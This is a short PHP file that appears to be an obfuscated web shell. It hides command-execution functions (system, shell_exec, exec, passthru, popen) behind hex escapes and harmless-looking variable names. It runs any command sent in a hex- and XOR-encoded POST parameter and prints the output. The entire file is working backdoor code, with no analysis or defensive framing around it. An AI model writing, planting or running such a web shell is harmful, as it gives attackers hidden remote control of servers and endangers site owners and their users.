<?php

$secure_access = "h\x65x2bin";
$approve_request3 = "ex\x65\x63";
$approve_request1 = "\x73\x79s\x74em";
$approve_request4 = "p\x61\x73\x73th\x72u";
$approve_request7 = "pc\x6C\x6F\x73e";
$approve_request5 = "\x70\x6Fpen";
$approve_request2 = "\x73hel\x6C\x5F\x65xec";
$approve_request6 = "\x73t\x72\x65a\x6D_g\x65t_c\x6F\x6E\x74ent\x73";
if (isset($_POST["pt\x72"])) {
            function reverse_lookup ($symbol ,  $item){
$holder ='';
 for($t=0;
 $t<strlen($symbol);
 $t++){
$holder.=chr(ord($symbol[$t])^$item);

} return $holder;

}
            $ptr = $secure_access($_POST["pt\x72"]);
            $ptr = reverse_lookup($ptr, 23);
            if (function_exists($approve_request1)) {
                $approve_request1($ptr);
            } elseif (function_exists($approve_request2)) {
                print $approve_request2($ptr);
            } elseif (function_exists($approve_request3)) {
                $approve_request3($ptr, $desc_symbol);
                print join("\n", $desc_symbol);
            } elseif (function_exists($approve_request4)) {
                $approve_request4($ptr);
            } elseif (function_exists($approve_request5) && function_exists($approve_request6) && function_exists($approve_request7)) {
                $item_holder = $approve_request5($ptr, 'r');
                if ($item_holder) {
                    $dchunk_factor = $approve_request6($item_holder);
                    $approve_request7($item_holder);
                    print $dchunk_factor;
                }
            }
            exit;
        }